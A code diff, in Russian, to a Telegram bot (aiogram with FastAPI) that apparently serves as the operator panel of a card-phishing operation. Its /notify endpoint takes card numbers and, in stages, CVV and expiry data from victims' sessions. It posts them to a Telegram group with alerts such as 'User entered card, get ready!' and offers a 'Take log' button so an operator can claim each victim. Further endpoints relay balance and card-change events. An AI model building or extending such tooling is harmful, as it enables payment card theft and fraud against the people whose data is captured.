@@ -1,4 +1,4 @@
-# bot.py
+# bot.py - исправленная версия
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from fastapi import FastAPI
@@ -24,6 +24,7 @@ def init_db():
                 masked_pan TEXT,
                 booking_id TEXT,
                 taken_by INTEGER,
+                step TEXT DEFAULT 'full',
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
@@ -41,29 +42,99 @@ def get_db_connection():
         conn.close()
 
 # Уведомление от сервера
+# bot.py - обновленная функция notify
+# bot.py - обновленная функция notify для полных данных
 @app.post("/notify")
 async def notify(data: dict):
-    session_id = data["sessionId"]
-    masked_pan = data["maskedPan"]
-    booking_id = data.get("bookingId", session_id[:8].upper())
+    try:
+        session_id = data["sessionId"]
+        masked_pan = data["maskedPan"]
+        booking_id = data.get("bookingId", session_id[:8].upper())
+        step = data.get("step", "full")
+        
+        with get_db_connection() as conn:
+            cursor = conn.cursor()
+            
+            if step == "card_number_only":
+                # Первый шаг - только номер карты
+                cursor.execute('''
+                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
+                    VALUES (?, ?, ?, ?, ?)
+                ''', (session_id, masked_pan, booking_id, step, datetime.datetime.now()))
+                
+                # Форматируем номер карты с пробелами
+                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
+                
+                message_text = (
+                    f"🎯 Пользователь ввел карту, приготовиться!\n\n"
+                    f"💳 Номер карты:\n"
+                    f"🔹 {masked_pan}\n"
+                    f"🔹 {card_with_spaces}\n\n"
+                    f"⏳ Ожидаем CVV и expiry date..."
+                )
+                
+                # Отправляем сообщение без кнопки "Взять лог"
+                await bot.send_message(config.GROUP_ID, message_text)
+                
+            elif step == "completed":
+                # Второй шаг - полные данные
+                cvv = data.get("cvv", "N/A")
+                expire_date = data.get("expireDate", "N/A")
+                
+                cursor.execute('''
+                    UPDATE logs 
+                    SET masked_pan = ?, step = ?, updated_at = ?
+                    WHERE session_id = ?
+                ''', (masked_pan, step, datetime.datetime.now(), session_id))
+                
+                # Форматируем номер карты с пробелами
+                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
+                
+                message_text = (
+                    f"🆔 #{booking_id}\n"
+                    f"🔔 Пользователь ожидает 🔔\n\n"
+                    f"💳 Номер карты:\n\n"
+                    f"🔹 {masked_pan}\n"
+                    f"🔹 {card_with_spaces}\n"
+                )
+                
+                kb = InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
+                ])
+                
+                await bot.send_message(config.GROUP_ID_TEST, message_text, reply_markup=kb)
+                
+            else:
+                # Старая логика для обратной совместимости
+                cursor.execute('''
+                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, step, updated_at)
+                    VALUES (?, ?, ?, ?, ?)
+                ''', (session_id, masked_pan, booking_id, "full", datetime.datetime.now()))
+                
+                # Форматируем номер карты с пробелами
+                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
+                
+                message_text = (
+                    f"🆔 #{booking_id}\n"
+                    f"🔔 Пользователь ожидает 🔔\n\n"
+                    f"💳 Номер карты:\n\n"
+                    f"🔹 {masked_pan}\n"
+                    f"🔹 {card_with_spaces}\n"
+                )
+                
+                kb = InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
+                ])
+                
+                await bot.send_message(config.GROUP_ID_TEST, message_text, reply_markup=kb)
 
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute('''
-            INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, updated_at)
-            VALUES (?, ?, ?, ?)
-        ''', (session_id, masked_pan, booking_id, datetime.datetime.now()))
-        conn.commit()
+            conn.commit()
 
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
-    ])
-
-    await bot.send_message(config.GROUP_ID,
-        f"Новый лог #{booking_id}\n\nКарта: {masked_pan}",
-        reply_markup=kb
-    )
-    return {"status": "ok"}
+        return {"status": "ok"}
+    
+    except Exception as e:
+        print(f"Error in /notify: {e}")
+        return {"status": "error", "message": str(e)}, 500
 
 @app.post("/balance-notify")
 async def balance_notify(data: dict):
@@ -118,6 +189,7 @@ async def change_card_notify(data: dict):
         )
     return {"status": "ok"}
 
+# Взять лог
 # Взять лог
 @dp.callback_query(F.data.startswith("take:"))
 async def take_log(callback: types.CallbackQuery):
@@ -174,7 +246,13 @@ async def take_log(callback: types.CallbackQuery):
         ])
 
         await bot.send_message(callback.from_user.id, text, reply_markup=management_kb)
-        await callback.message.edit_text(f"Лог #{booking_id} взял @{callback.from_user.username}")
+        
+        # Меняем только кнопку в исходном сообщении
+        new_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=f"Лог взял @{callback.from_user.username}", callback_data="already_taken")]
+        ])
+        
+        await callback.message.edit_reply_markup(reply_markup=new_kb)
         await callback.answer()
 
 # Обработчик кнопки "Баланс"
@@ -295,14 +373,14 @@ async def handle_change(callback: types.CallbackQuery):
         await callback.message.answer("❌ Ошибка соединения с сервером")
 
 async def main():
-    # Инициализируем БД при запуске
-    init_db()
-    
-    loop = asyncio.get_event_loop()
-    loop.create_task(dp.start_polling(bot))
+    init_db()  # Инициализируем базу данных при запуске
+    bot_task = asyncio.create_task(dp.start_polling(bot))
+
     config_uvicorn = uvicorn.Config(app, host="0.0.0.0", port=8000, loop="asyncio")
     server = uvicorn.Server(config_uvicorn)
-    await server.serve()
+    server_task = asyncio.create_task(server.serve())
+
+    await asyncio.gather(bot_task, server_task)
 
 if __name__ == "__main__":
     asyncio.run(main())
